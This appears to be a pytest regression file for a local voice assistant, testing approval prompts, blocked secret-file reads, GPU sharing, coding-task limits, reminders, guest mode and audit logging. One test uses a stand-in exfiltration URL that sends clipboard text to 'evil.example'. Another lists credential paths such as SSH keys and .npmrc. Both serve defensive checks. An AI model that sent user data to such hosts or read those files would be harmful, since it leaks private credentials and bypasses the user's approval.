"""Regression tests for the second gap review: approval text, secrets, GPU sharing, coding tasks, reminders shared by
two processes, pre-approval, guest mode in the panel, the chat turn lock, settings parsing and workflow auditing."""

import asyncio
import json
import sys
import threading
import time

import httpx
import pytest
from voxvortex.llm import TextDelta

from vox_assistant.audit import AuditLog
from vox_assistant.config import Settings
from vox_assistant.permissions import PermissionGate, Risk, Tool, ok
from vox_assistant.tools import build_registry
from vox_assistant.webapp import create_app as create_web


def web(app):
    return httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://127.0.0.1:8765")


def test_open_url_approval_shows_the_whole_address():
    from vox_assistant.tools.apps import describe_url

    assert describe_url({"url": "https://youtube.com/"}) == "open the web page youtube.com"
    said = describe_url({"url": "https://evil.example/c?d=MY-CLIPBOARD-TEXT"})
    assert "evil.example/c?d=MY-CLIPBOARD-TEXT" in said  # data riding in the query is visible before approving


async def test_secret_files_and_folders_are_never_read(settings, tmp_path):
    from vox_assistant.tools.files import looks_secret

    root = tmp_path / "proj"
    secret = (".git/config", "keys/id_ed25519", ".npmrc", "cert.pfx", "app/.ssh/known_hosts")
    for rel in (*secret, "notes.md"):
        (root / rel).parent.mkdir(parents=True, exist_ok=True)
        (root / rel).write_text("x", encoding="utf-8")
    settings.search_roots = [str(root)]
    reg, _ = build_registry(settings)
    for rel in secret:
        assert looks_secret(root / rel), rel
        assert "secrets" in (await reg.get("read_text_file").handler({"path": str(root / rel)}))["error"]
    assert (await reg.get("read_text_file").handler({"path": str(root / "notes.md")}))["ok"]
    assert (await reg.get("find_files").handler({"query": "config"}))["matches"] == []  # .git is not searched


async def test_loading_a_model_beside_the_assistant_says_so_and_checks_it_still_answers(settings, monkeypatch):
    from vox_assistant.tools import models as models_mod

    catalog = {"catalog": {"lanes": [{"key": "r9700", "display": "R9700", "port": 8081},
                                     {"key": "9070xt", "display": "RX 9070 XT", "port": 8082}],
                           "models": [{"id": "lm:gemma", "name": "gemma-4-12B", "exists": True}]}}

    def handler(req: httpx.Request):
        if req.url.path == "/api/bootstrap":
            return httpx.Response(200, json=catalog)
        if req.url.path == "/api/clients/deploy_lane":
            lane = json.loads(req.content)["lane"]
            return httpx.Response(200, json={"servers": [{"lane_keys": [lane], "alive": True}]})
        if req.url.path == "/health":  # the voice service: down after the load
            return httpx.Response(503)
        return httpx.Response(200, json={"data": [{"id": "voice"}]})  # the assistant's own LLM

    real = httpx.AsyncClient
    monkeypatch.setattr(models_mod.httpx, "AsyncClient", lambda **kw: real(transport=httpx.MockTransport(handler), **kw))
    tool = {t.name: t for t in models_mod.make_tools(settings)}["load_model"]
    assert "also runs my language model" in tool.intent({"model": "gemma", "gpu": "the R9700"})
    assert "also runs my voice" in tool.intent({"model": "gemma", "gpu": "9070 XT"})
    r = await tool.handler({"model": "gemma", "gpu": "9070"})
    assert r["shared_gpu_with"] == ["my voice"] and r["still_answering"] == {"my voice": False}
    assert "did not answer" in r["note"]
    r = await tool.handler({"model": "gemma", "gpu": "r9700"})
    assert r["still_answering"] == {"my language model": True}


def test_one_coding_task_per_project_a_time_limit_and_history_that_survives_a_restart(settings, tmp_path, monkeypatch):
    from vox_assistant import tasks as tasks_mod
    from vox_assistant.tasks import TaskBusy, TaskManager

    settings.coding_agent = [sys.executable, "-c", "{task}"]  # a real process that just sleeps
    monkeypatch.setattr(tasks_mod.shutil, "which", lambda name: name)
    project = tmp_path / "proj"
    project.mkdir()
    settings.coding_task_timeout_min = 0.5 / 60  # half a second
    tm = TaskManager(settings)
    job = tm.start(project, "__import__('time').sleep(30)")
    with pytest.raises(TaskBusy):
        tm.start(project, "print(1)")  # two agents in one folder would edit the same files
    with pytest.raises(ValueError, match="only wired up for OpenCode"):
        tm.start(tmp_path, "print(1)", allow_changes=True)  # not silently ignored
    for _ in range(100):
        if "stopped after" in tm.state(job["id"])["last_line"]:
            break
        time.sleep(0.1)
    assert tm.state(job["id"])["status"] == "timed out"
    again = TaskManager(settings).state(job["id"])  # a new panel process
    assert again["status"] == "timed out" and "stopped after" in again["last_line"]


async def test_hands_free_sends_coding_tasks_to_the_panel(settings, monkeypatch):
    from vox_assistant import tasks as tasks_mod
    from vox_assistant.tasks import PanelTasks
    from vox_assistant.tools.projects import make_tools as project_tools

    posted = []

    def post(url, json, timeout):
        posted.append((url, json))
        return httpx.Response(200, json={"id": "t9", "status": "running"}, request=httpx.Request("POST", url))

    monkeypatch.setattr(tasks_mod.httpx, "post", post)
    root = settings.data_dir / "projects"
    (root / "Cutline").mkdir(parents=True)
    settings.search_roots = [str(root)]
    tool = {t.name: t for t in project_tools(settings, PanelTasks("http://127.0.0.1:8765"))}["delegate_coding_task"]
    r = await tool.handler({"project": "cutline", "task": "fix it"})
    assert r["ok"] and r["task_id"] == "t9" and "Tasks panel" in tool.description
    assert posted == [("http://127.0.0.1:8765/api/tasks", {"project": "Cutline", "task": "fix it", "allow_changes": False})]
    untracked = {t.name: t for t in project_tools(settings, None)}["delegate_coding_task"]
    assert "Tasks panel" not in untracked.description and untracked.escalate is None


def test_two_processes_never_take_the_same_reminder(tmp_path):
    from vox_assistant.tools.reminders import ReminderStore, is_late

    a, b = ReminderStore(tmp_path / "r.sqlite3"), ReminderStore(tmp_path / "r.sqlite3")  # panel and hands-free
    try:
        for i in range(20):
            a.add(f"r{i}", 0.00001)
        time.sleep(0.05)
        got: list = []
        threads = [threading.Thread(target=lambda: got.extend(a.claim_due())),
                   threading.Thread(target=lambda: got.extend(b.due()))]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        assert sorted(r["text"] for r in got) == sorted(f"r{i}" for i in range(20))  # each exactly once
        assert is_late({"due": time.time() - 600}) and not is_late({"due": time.time() - 5})
    finally:
        a.close()
        b.close()


async def test_pre_approval_is_a_setting_and_never_covers_an_escalated_call(settings, tmp_path):
    asked = []

    async def confirm(intent, tool, args):
        asked.append(args)
        return False

    async def handler(args):
        return ok()

    tool = Tool("delegate", "d", {}, Risk.ACT, handler, escalate=lambda a: a.get("allow_changes") is True)
    gate = PermissionGate(confirm, AuditLog(tmp_path / "a.sqlite3"), {"delegate"})
    assert await gate.authorize(tool, {}) == (True, "pre-approved")
    assert await gate.authorize(tool, {"allow_changes": True}) == (False, "denied") and asked

    settings.auto_approve = ["open_app"]
    assert create_web(settings, llm=object()).state.agent.gate.auto_approve == {"open_app"}


async def test_guest_mode_switched_on_by_voice_keeps_the_panel_off_the_cloned_voice(settings, monkeypatch):
    from vox_assistant import webapp

    class Neutral:
        sample_rate = 16000

        def __init__(self, **kw):
            pass

        async def synth(self, text):
            yield b"\x00\x01" * 160

    monkeypatch.setattr(webapp, "NeutralVoiceTTS", Neutral)
    app = create_web(settings, llm=object(), tts_transport=httpx.MockTransport(
        lambda req: httpx.Response(200, content=b"RIFFcloned", headers={"x-voice": "me_v1"})))
    listen = app.state.services.services["listen"]
    async with web(app) as c:
        assert (await c.post("/api/speak", json={"text": "hi", "voice_mode": "cloned"})).headers["x-voice"] == "me_v1"
        listen.alive, listen.flags["guest_mode"] = (lambda: True), True  # "we have guests", said to hands-free mode
        assert (await c.post("/api/speak", json={"text": "hi", "voice_mode": "cloned"})).headers["x-voice"] == "neutral"
        r = await c.post("/api/speak/stream", json={"text": "hi", "voice_mode": "cloned"})
        assert r.headers["x-voice"] == "neutral"
        assert (await c.get("/api/status")).json()["guest_mode"] is True


async def test_a_second_chat_request_is_refused_while_the_first_has_the_turn(settings):
    class Slow:
        async def stream(self, messages, tools=None, **kw):
            await asyncio.sleep(0.2)
            yield TextDelta("Done.")

    app = create_web(settings, llm=Slow())
    async with web(app) as c:
        a, b = await asyncio.gather(c.post("/api/chat", json={"text": "one"}), c.post("/api/chat", json={"text": "two"}))
        assert sorted([a.status_code, b.status_code]) == [200, 409]
        assert (await c.post("/api/chat", json={"text": "three"})).status_code == 200  # the lock was released


def test_settings_from_environment_parse_tables_and_device_indexes(tmp_path, monkeypatch):
    monkeypatch.setenv("VOXA_APPS", '{"notepad": "notepad"}')
    monkeypatch.setenv("VOXA_INPUT_DEVICE", "3")
    monkeypatch.setenv("VOXA_OUTPUT_DEVICE", "Headset")
    s = Settings.load(tmp_path)
    assert s.apps == {"notepad": "notepad"} and s.input_device == 3 and s.output_device == "Headset"


async def test_each_workflow_step_is_in_the_audit_log(settings):
    app = create_web(settings, llm=object())
    reg, audit = app.state.agent.registry, app.state.audit

    async def fake(args):
        return ok()

    for name in ("gpu_status", "system_info", "list_reminders"):
        reg.get(name).handler = fake
    await reg.get("run_workflow").handler({"name": "status_check"})
    logged = [e["tool"] for e in audit.recent() if e["decision"] == "workflow status_check"]
    assert sorted(logged) == ["gpu_status", "list_reminders", "system_info"]


def test_a_failing_audit_write_does_not_raise(tmp_path):
    log = AuditLog(tmp_path / "a.sqlite3")
    log.close()
    log.record("tool", "x")  # closed database: logged as a warning, the turn carries on


async def test_gpu_recognition_gets_at_most_60_s_and_a_refusal_is_logged_with_its_reason(caplog):
    from vox_assistant.asr_remote import MAX_PCM_BYTES, ServiceASR

    sent = []

    def handler(request):
        sent.append(len(json.loads(request.content)["pcm_b64"]))
        return httpx.Response(400, json={"detail": "send 16 kHz PCM16 audio, at most 60 s"})

    class Cpu:
        async def transcribe(self, pcm, *, language="auto", prompt=None):
            return "from cpu"

    asr = ServiceASR("http://voice", fallback=Cpu())
    asr._client = httpx.AsyncClient(base_url="http://voice", transport=httpx.MockTransport(handler))
    assert await asr.transcribe(b"\x00\x01" * (16000 * 70)) == "from cpu"
    assert sent == [len(__import__("base64").b64encode(b"\x00" * MAX_PCM_BYTES))]
    assert "400: " in caplog.text and "at most 60 s" in caplog.text and "70.0 s of audio" in caplog.text
    await asr.aclose()
